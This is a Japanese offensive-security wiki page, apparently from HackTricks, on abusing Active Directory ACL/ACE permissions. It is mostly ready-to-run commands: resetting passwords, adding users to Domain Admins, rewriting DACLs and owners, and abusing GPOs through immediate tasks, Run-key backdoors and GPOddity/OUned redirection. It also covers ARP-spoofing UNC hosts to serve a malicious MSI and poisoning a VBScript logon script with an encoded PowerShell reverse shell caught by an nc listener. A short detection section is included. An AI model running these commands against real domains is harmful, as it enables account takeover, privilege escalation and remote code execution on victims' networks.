# Active Directory ACL/ACE の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に、**[**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **の手法をまとめたものです。詳細は元の記事を確認してください。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **ユーザーに対する GenericAll 権限**

この権限により、攻撃者は対象のユーザーアカウントを完全に制御できます。`Get-ObjectAcl` コマンドを使って `GenericAll` 権限を確認したら、攻撃者は次の操作を行えます。

- **対象ユーザーのパスワードを変更する**: `net user <username> <password> /domain` を使って、ユーザーのパスワードをリセットできます。
- Linux からは、Samba の `net rpc` を使って SAMR 経由で同じ操作を行えます。<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **アカウントが無効化されている場合は、UAC フラグをクリアする**: `GenericAll` を使うと `userAccountControl` を編集できます。Linux から BloodyAD を使って `ACCOUNTDISABLE` フラグを削除できます:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: ユーザーアカウントにSPNを割り当ててkerberoast可能にし、RubeusとtargetedKerberoast.pyを使ってticket-granting ticket (TGT)のハッシュを抽出し、クラックを試みます。

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: ユーザーの事前認証を無効化し、そのアカウントをASREPRoastingに対して脆弱にする。

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: ユーザーに対する `GenericAll` 権限があれば、証明書ベースの資格情報を追加し、パスワードを変更せずにそのユーザーとして認証できます。詳細は次を参照してください。

{{#ref}}
shadow-credentials.md
{{#endref}}

## **グループに対するGenericAll権限**

この権限があれば、攻撃者は `Domain Admins` などのグループに対する `GenericAll` 権限を持つ場合、グループメンバーシップを操作できます。`Get-NetGroup` でグループの識別名を特定した後、攻撃者は次の操作を実行できます。

- **自分をDomain Adminsグループに追加する**: 直接コマンドを実行するか、Active DirectoryやPowerSploitなどのモジュールを使用して実行できます。

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linuxからは、対象グループに対する GenericAll/Write membership を持っている場合、BloodyADを使って任意のグループに自分を追加することもできます。対象グループが「Remote Management Users」にネストされている場合、そのグループを適用しているホストで直ちにWinRMアクセスを獲得できます:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **コンピューター / ユーザーに対する GenericAll / GenericWrite / Write**

コンピューターオブジェクトまたはユーザーアカウントに対するこれらの権限を持つと、次のことが可能になります。

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトを乗っ取れます。
- **Shadow Credentials**: Shadow Credentialsを作成する権限を悪用し、コンピューターまたはユーザーアカウントになりすます手法です。

## オブジェクトを継承されたOU権限の範囲内に移動する

アカウントに対する**移動権限**と、移動先OUから継承される**書き込み権限**を組み合わせることで、どちらのプリンシパルも当初はアカウントの機密属性を変更できなくても、権限を得られる場合があります。移動元オブジェクトに対する移動権限と、移動先に対する`CreateChild`を確認してから、オブジェクトを移動し、適用後のDACLを再確認してください。たとえば、powerview.pyの`Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'`でユーザーを移動できます。その後、そのOUに継承された`GenericWrite`を持つ制御下のグループが、[shadow credential](shadow-credentials.md)を追加できます。移動によって継承権限そのものが付与されるわけではありません。<sup>[[18]](#references)</sup>

OUに対する`GenericAll`を持っているものの、適切な継承ACEがない場合は、`bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>`を使って、その子孫にACEを追加できます。対象アカウントは個別にテストしてください。**AdminSDHolderで保護されたアカウントでは継承が無効**になっているため、OUのACEが一般ユーザーには適用されても、保護されたユーザーには適用されない場合があります。[AdminSDHolderとSDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group)を参照してください。<sup>[[18]](#references)</sup>

別の悪用経路として、特権で実行されるスケジュール済みクリーンアップスクリプトが、攻撃者の影響を受けるACEに基づいてOUを選び、その子孫に対して`Set-ADObject -Clear adminCount`**と**`$acl.SetAccessRuleProtection($False, $False)`を実行するケースがあります。OUのDACLを変更できる場合は、スクリプトが確認するグループに、必要な`ExtendedRight`または`GenericAll` ACEを付与してください。また、タスクを実行できることも別途確認してください。これにより、特権タスクが以前保護されていたアカウントの継承を再び有効化し、OUのACEを適用できるようになります。スクリプトの内容、起動権限、変更後のDACLを確認してください。`adminCount`をクリアするだけでは継承は再有効化されず、保護対象グループに残っているアカウントはSDPropによって再び保護されることがあります。<sup>[[18]](#references)</sup>

## **グループに対するWriteProperty**

ユーザーが特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対する`WriteProperty`権限を持つ場合、次のことが可能です。

- **自分自身をDomain Adminsグループに追加する**: `net user`コマンドと`Add-NetGroupUser`コマンドを組み合わせて実行できます。この方法により、ドメイン内で権限昇格が可能です。

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **グループに対する Self (Self-Membership)**

この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、自分自身を `Domain Admins` などの特定のグループに追加できます。次のコマンドを実行すると、自分自身を追加できます。

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

同様の権限で、グループに対する `WriteProperty` 権限を持つ攻撃者は、グループのプロパティを変更して自分自身を直接グループに追加できます。この権限の確認と実行には、次のコマンドを使用します。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

ユーザーに対する `User-Force-Change-Password` の `ExtendedRight` を持っていると、現在のパスワードを知らなくてもパスワードをリセットできます。この権限の確認と悪用は、PowerShellまたは代替のコマンドラインツールで実行でき、対話型セッションや非対話型環境向けのワンライナーなど、ユーザーのパスワードをリセットする複数の方法があります。コマンドは、シンプルなPowerShellの実行からLinux上での `rpcclient` の使用まで幅広く、攻撃手段の多様性を示しています。

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **グループに対するWriteOwner**

攻撃者がグループに対する`WriteOwner`権限を持っていることが分かった場合、グループの所有者を自分自身に変更できます。対象のグループが`Domain Admins`の場合、所有者を変更することでグループの属性やメンバーシップをより広範に制御できるため、特に大きな影響があります。この手順では、`Get-ObjectAcl`を使って適切なオブジェクトを特定し、`Set-DomainObjectOwner`を使ってSIDまたは名前を指定し、所有者を変更します。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **ユーザーに対するGenericWrite**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセス権があれば、ユーザーのログオン時に悪意のあるスクリプトを実行するよう、ユーザーのログオンスクリプトのパスを変更できます。これは、`Set-ADObject` コマンドを使用して、対象ユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現します。

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

ユーザーの [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) にスコープされた、より限定的な `WriteProperty` ACE で十分な場合があります。`GenericWrite` は必要ありません。この属性への権限と、ドメインの `SYSVOL\<domain>\scripts` または `NETLOGON` ツリー内にある書き込み可能なスクリプトを組み合わせ、対象ユーザーがログオンしてそのスクリプトに到達する可能性を評価します。スクリプトはログオン時に、そのユーザーのコンテキストで実行されます。有効な AD ACL とファイル／共有 ACL は個別に確認してください。一致する Allow ACE や書き込み可能なディレクトリだけでは、完全な実行経路が成立するとは限りません。

## **グループに対する GenericWrite**

この権限を使うと、攻撃者は自分や他のユーザーを特定のグループに追加するなど、グループメンバーシップを操作できます。この手順では、credential object を作成し、それを使ってグループへのユーザーの追加や削除を行い、PowerShell コマンドでメンバーシップの変更を確認します。

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux からは、グループに対する `GenericWrite` を持っていれば、Samba の `net` でメンバーを追加・削除できます（PowerShell/RSAT が利用できない場合に便利です）：<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

ADオブジェクトの所有権を持ち、そのオブジェクトに対する`WriteDACL`権限があると、攻撃者は自分自身にオブジェクトに対する`GenericAll`権限を付与できます。これはADSIの操作によって実現でき、オブジェクトを完全に制御し、そのグループメンバーシップを変更できます。ただし、Active Directoryモジュールの`Set-Acl` / `Get-Acl`コマンドレットを使用してこれらの権限を悪用しようとする場合、制限があります。<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner による迅速な乗っ取り（PowerView）

ユーザーまたはサービスアカウントに対して `WriteOwner` と `WriteDacl` を持っている場合、PowerView を使って完全に制御し、古いパスワードを知らなくてもパスワードをリセットできます。

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

注意:
- `WriteOwner` しか持っていない場合は、まず所有者を自分に変更する必要があります。

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- パスワードリセット後、任意のプロトコル（SMB/LDAP/RDP/WinRM）でアクセスを確認します。

## **ドメインでのレプリケーション（DCSync）**

DCSync攻撃は、ドメイン上の特定のレプリケーション権限を悪用し、Domain Controllerになりすましてユーザーの認証情報を含むデータを同期します。この強力な手法には、`DS-Replication-Get-Changes`などの権限が必要です。これにより、攻撃者はDomain Controllerに直接アクセスすることなく、AD環境から機密情報を抽出できます。<sup>[[5]](#references)</sup> [**DCSync攻撃について詳しくはこちら。**](../dcsync.md)

## GPO委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO委任

Group Policy Objects（GPO）の管理を委任されたアクセス権は、重大なセキュリティリスクにつながる可能性があります。たとえば、`offense\spotless`のようなユーザーにGPO管理権限が委任されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner**などの権限を持つ可能性があります。PowerViewを使って特定できるこれらの権限は、悪意ある目的に悪用されるおそれがあります。`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO権限の列挙

設定ミスのあるGPOを特定するには、PowerSploitのコマンドレットを連結して使用できます。これにより、特定のユーザーが管理権限を持つGPOを見つけられます。`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピューター**: 特定のGPOが適用されるコンピューターを特定し、潜在的な影響範囲を把握できます。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピューターに適用されているポリシー**: `Get-DomainGPO`などのコマンドを使うと、特定のコンピューターにどのポリシーが適用されているか確認できます。

**特定のポリシーが適用されているOU**: `Get-DomainOU`を使用すると、特定のポリシーの影響を受ける組織単位（OU）を特定できます。

[**GPOHound**](https://github.com/cogiceo/GPOHound)を使ってGPOを列挙し、問題を見つけることもできます。

### GPOの悪用 - New-GPOImmediateTask

設定ミスのあるGPOは、たとえば即時実行のスケジュールタスクを作成してコードを実行するために悪用できます。これを利用して、影響を受けるマシンのローカルAdministratorsグループにユーザーを追加し、権限を大幅に昇格できます。

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - GPO の悪用

GroupPolicy module がインストールされている場合、新しい GPO の作成とリンク、および影響を受けるコンピューターで backdoor を実行するためのレジストリ値などの設定が可能です。この方法では、GPO を更新し、実行するコンピューターにユーザーがログインする必要があります：

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、新しいGPOを作成せずにタスクを追加したり設定を変更したりして、既存のGPOを悪用する方法を提供します。このツールを使用するには、変更を適用する前に既存のGPOを変更するか、RSATツールを使用して新しいGPOを作成する必要があります。

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### ポリシー更新の強制

GPOは通常、約90分ごとに更新されます。この処理を早めるには、特に変更を実施した後、対象コンピューターで `gpupdate /force` コマンドを実行すると、ポリシーを直ちに更新できます。このコマンドにより、次回の自動更新サイクルを待たずに、GPOへの変更が適用されます。

### 内部の仕組み

`Misconfigured Policy` のような特定のGPOのスケジュールタスクを調べると、`evilTask` などのタスクが追加されていることを確認できます。これらのタスクは、システムの動作を変更したり、権限を昇格させたりするために、スクリプトやコマンドラインツールを使って作成されます。

`New-GPOImmediateTask` によって生成されたXML構成ファイルには、実行するコマンドやトリガーなど、スケジュールタスクの詳細が記述されています。このファイルは、GPO内でスケジュールタスクを定義、管理する方法を示しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行できます。

### ユーザーとグループ

GPOでは、対象システム上のユーザーやグループのメンバーシップも操作できます。Users and Groupsのポリシーファイルを直接編集することで、攻撃者はユーザーをローカルの `administrators` グループなどの特権グループに追加できます。これは、GPO管理権限の委任によって可能になります。この権限があれば、ポリシーファイルを変更してユーザーを追加したり、グループメンバーシップを変更したりできます。

Users and GroupsのXML構成ファイルには、これらの変更を実施する方法が記述されています。このファイルにエントリを追加すると、特定のユーザーに影響を受けるシステム全体で高い権限を付与できます。この方法は、GPOを操作して直接権限を昇格させる手段となります。

ローカルグループのメンバーシップやユーザー権利などのセキュリティ設定については、適用されているGPOテンプレート `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` と、`SecEdit` ディレクトリのACLも確認してください。書き込み可能なディレクトリやファイルは調査の手掛かりになりますが、変更が有効になるかどうかは、実際に有効なSYSVOL共有アクセス、拒否ACLと継承ACL、Group Policyコンテナーの権限、ポリシーの適用範囲、クライアントの更新によって決まります。「GPO Managers」という名前のグループに所属しているだけでは、編集権限があるとは限りません。[Microsoftは、このテンプレートのパスと、Group Policyコンテナーとテンプレートの分離について説明しています。](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

さらに、ログオン／ログオフスクリプトの利用、自動実行用のレジストリキーの変更、.msiファイルによるソフトウェアのインストール、サービス構成の編集など、コード実行や永続化を実現する追加の方法も検討できます。これらの手法により、GPOの悪用を通じてアクセスを維持し、対象システムを制御するさまざまな方法が得られます。

### 認証済みの不正サービスへのGPC/GPT取得先のリダイレクト

GPOは、メタデータを持つLDAP上の**Group Policy Container (GPC)**と、ポリシーファイルを持つSMBホスト上の**Group Policy Template (GPT)**で構成されます。更新時、クライアントはコンテナーの `gPLink` に従い、参照先のGPCとその `gPCFileSysPath` を読み込み、そのUNCパスからGPTをダウンロードします。そのため、GPC自体、またはOU、Site、Domainの `gPLink` への書き込みアクセスを利用して、特権で実行されるポリシー処理を引き起こせます。<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddityによる `gPCFileSysPath` の汚染

制御下のプリンシパルが、直接、または**NTLM relay to LDAP**を通じて対象GPCに書き込める場合、`gPCFileSysPath` を攻撃者がホストするUNCパスに置き換えます。[GPOddity](https://github.com/synacktiv/GPOddity)は、LDAPの変更を自動化し、モジュールベースのポリシーファイル、またはGroup Policyクライアントが `NT AUTHORITY\SYSTEM` として実行するImmediate Taskを含む悪意のあるGPTを配信します。<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

匿名または資格情報を問わないSMB共有は、現在のWindowsクライアントでは不十分です。SMB Secure Negotiateは認証が成功したことの証明を要求するため、不正サービスはドメインのIDを検証し、SMBセッションキーを導出して、応答に正しく署名する必要があります。組み込みモードでは、制御下のマシンアカウントとそのサービスキーを使うようにGPOddityを設定し、`[COMMANDS]` セクションでコンピューター側またはユーザー側のペイロードを選択します。<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**ユーザー GPO の特殊ケース:** MS16-072 の後も、Windows は**同じ TCP 接続内に**2つの SMB2 セッションを作成します。ユーザーセッションが `GPT.INI` を読み取り、その後、コンピューターアカウントのセッションが `ScheduledTasks.xml` などの有効な構成を読み取ります。そのため、不正サーバーは認証状態、セッションキー、署名キーをソケットだけでなく SMB2 の `SessionId` ごとに管理する必要があります。GPOddity/OUned に組み込まれた Scapy fork は、`SMBStreamSocketMultiplexing` と多重化に対応した `SMBServer` によってこれを実装しています。単一セッション用の Impacket/Scapy サーバーでは、誤った署名状態が再利用され、ユーザーポリシーで失敗します。<sup>[[15]](#references)</sup>

#### OUned による `gPLink` poisoning

OU、Site、Domain に対する `WriteGPLink`、`GenericWrite`、または同等の制御権限があれば、攻撃者は GPC DN が攻撃者の管理する LDAP ホストによって提供されるリンクを追加できます。この手法は Petros Koutroumpis によって最初に紹介されました。[OUned](https://github.com/synacktiv/OUned) は LDAP への書き込みと悪意のある GPC/GPT チェーンを自動化します。<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

被害者は最初に不正なLDAPサービスに認証し、`gPCFileSysPath`が不正なSMBサービスを指すGPCを受け取ります。その後、SMBに認証して、提供されたGPTを適用します。したがってOUnedには、LDAP SPNを持つアカウント、SMB用のHOST SPNを持つマシンアカウント（同じマシンアカウントで両方を満たせます）、およびポート389と445をオペレーターのホストに転送するDNS解決またはリバースフォワーディングが必要です。<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUnedに組み込まれたScapy LDAPサーバーは、実際の管理対象サービスキーを使ってKerberos/SPNEGOを検証し、JSONから任意のGPCデータを提供します。空のJSONキーはrootDSEを表し、`base64:`プレフィックスはバイナリ値を表します。また、このサーバーはadd/delete/modify/searchに加え、`BASE`、`LEVEL`、`SUBTREE`検索をサポートし、保護なし、整合性保護、機密性保護をネゴシエートできます。これにより、攻撃者が制御するLDAP参照をたどる別のWindowsコンポーネントが、認証済みLDAPを要求する場合でも、このサービスを再利用できます。<sup>[[15]](#references)</sup>

アカウントのパスワードをダミードメインに同期しても、Kerberosキーがすべて再現されるとは限りません。RC4はパスワードから導出されますが、AESのstring-to-keyでは、プリンシパルのホスト名/ドメインから導出されるソルトも使われます。実際のアカウントAESキーを`KerberosSSP`に渡せば、検出されやすいマシンアカウント自身が書き込み可能な`msDS-SupportedEncryptionTypes`の変更によってRC4を強制する必要がなくなります。<sup>[[15]](#references)</sup>

#### 検知のポイント

`gPCFileSysPath`または`gPLink`の変更を、GPOのバージョン変更や新しいImmediate/Scheduled Task XMLと関連付けて調査します。予期しない名前付けコンテキストへのリンク、承認済みDC/SYSVOL以外のUNCホスト、マシンアカウント名をリダイレクトするDNSレコード、通常と異なるマシンアカウントのLDAP/CIFSサービスチケット、RC4を有効にする`msDS-SupportedEncryptionTypes`の変更を調査します。<sup>[[15]](#references)</sup>

### WriteGPLink + UNCパスハイジャック（ARP spoofing）

OU/domainに対する`WriteGPLink`があれば、GPO自体を編集せずに、対象コンテナーの`gPLink`属性を変更して**既存のGPOを強制適用**できます。リンクされたGPOが**UNCパス**（`\\HOST\share\...`）経由でリモートコンテンツをすでに参照している場合、これは有効な手法になります。認証済みユーザーは**SYSVOL**を読み取れるため、オフラインで再利用可能なポリシーを探せます。<sup>[[11]](#references)</sup>

大まかな手順:

1. BloodHoundを使って、OUに対する`WriteGPLink`を持つプリンシパルを特定し、そのOU内のコンピューター/ユーザーを列挙します。
2. `SYSVOL`を読み取り専用で複製し、GPOを解析して、UNCパスを参照する**Software Installation**、**ドライブマッピング**（`Drives.xml`）、**ログオン/スタートアップスクリプト**を探します。
3. DFS/domain-namespaceパスではなく、**直接のホスト名**（例: `\\DC02\share\pkg.msi`）を指すポリシーを優先します。ホスト名ベースのパスは、L2 spoofingでリダイレクトしやすいためです。
4. 選んだGPO GUIDを対象OUの`gPLink`に追加し、被害者に既存のポリシーを処理させます。
5. 同じブロードキャストドメイン上で、UNCホストにARP spoofingを行い、そのIPをローカルにバインドします（`ip addr add <target_ip>/32 dev <iface>`）。これにより、被害者のSMBトラフィックが攻撃者のホストに届きます。
6. 攻撃者のSMBサーバー（例: `smbserver.py`）で、想定されるパス/ファイル名を提供し、通常のポリシー処理を待ちます。

`SYSVOL`の収集とGPOの関連付けの例:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

既存の GPO を対象の OU にリンクします。

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

リンクされたGPOがUNCパスからMSIを配布する場合、クライアントは**コンピューターの起動時**にそれを取得し、**`NT AUTHORITY\SYSTEM`**としてインストールします。参照先ホストになりすまし、**同じ共有パス／パス／ファイル名**で悪意のあるMSIを配信すれば、**SYSVOLを変更せずに**`WriteGPLink`をSYSTEMでのコード実行につなげられます。

重要な制約:

- **タイミングが重要**: 新しいリンクはポリシーの更新時（通常は約90分後）に認識されますが、**Software Installation**は通常、**再起動時**に実行されます。
- Windows Installerは通常、パッケージのデプロイを**`ProductCode`**で追跡します。製品がすでにインストールされている場合、デプロイがスキップされることがあります。
- インストーラーに拒否されないよう、悪意のあるMSIをパッチして、**`ProductCode`**と**`PackageCode`**をGPOが想定する正規のパッケージと一致させます。
- 古い`.aas`広告ファイルが`SYSVOL`に残っている場合があるため、この方法に頼る前に、デプロイがまだ有効に見えることを確認してください。

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP のドライブマッピングは、`Drives.xml` によって、ログオン時または再接続時にユーザーを設定済みの UNC パスへ認証させます。参照先ホストをスプーフィングすると、**NetNTLMv2** をキャプチャできます。SMB を意図的に失敗させると、Windows は **WebDAV** 経由で再試行し、**HTTP 経由の NTLM** を送信することがあります。これは **LDAP(S)**、**AD CS**、または **SMB** へのリレーに、はるかに柔軟に利用できます。

#### Logon/startup script UNC hijack

同じ手法は、`SYSVOL` 内で見つかった UNC ホストのスクリプトにも適用できます。

- **Logon scripts** は通常、**user** コンテキストで実行されます。
- **Startup scripts** は通常、**computer / SYSTEM** コンテキストで実行されます。

スクリプトのパスがスプーフィング可能なホスト名を指している場合は、UNC ホストをリダイレクトし、想定される場所から置き換え用のスクリプトコンテンツを配信します。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` 配下の書き込み可能なパスを利用すると、GPO 経由でユーザーログオン時に実行されるログオンスクリプトを改ざんできます。これにより、ログオンするユーザーのセキュリティコンテキストでコードを実行できます。

### ログオンスクリプトを特定する
- 設定済みのログオンスクリプトがあるか、ユーザー属性を確認します：

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- ドメイン共有をクロールして、スクリプトへのショートカットや参照を探し出す:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` ファイルを解析して、SYSVOL/NETLOGON 内を指すターゲットを特定する（DFIR で役立つ手法であり、GPO に直接アクセスできない攻撃者にも有用）：

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound は、ユーザーオブジェクトに `scriptPath` ログオンスクリプト属性が設定されている場合、その属性を表示します。GPO で設定されたログオンスクリプトは別個のポリシー参照なので、該当する GPO も確認してください。

### 書き込み権限を検証する（共有一覧を鵜呑みにしない）
自動化ツールでは SYSVOL/NETLOGON が読み取り専用と表示されても、対象のスクリプトには異なる NTFS ACL が設定されている場合があります。まず、そのファイルと親ディレクトリを読み取り専用で調査してください。一致する Allow ACE は候補として残ります。実効的な SMB と NTFS のアクセス権、Deny ACE、現在のトークンがすべて影響するためです。

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

認可された書き込みテストは対象を限定し、元に戻せるように実施してください。元のスクリプトをバックアップし、テスト後に復元します。アクセス権を試すためだけに、正常に動作しているログオンスクリプトを上書きしないでください。書き込みに成功すると、次回のユーザーのログオン時に実行される可能性があります。

### RCE のために VBScript ログオンスクリプトを改変する
業務機能を損なわないよう元のロジックは残したまま、PowerShell reverse shell を起動するコマンドを追記します（revshells.com で生成）：

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

ホスト上で待ち受け、次の対話型ログオンを待ちます:

```bash
rlwrap -cAr nc -lnvp 443
```

Notes:
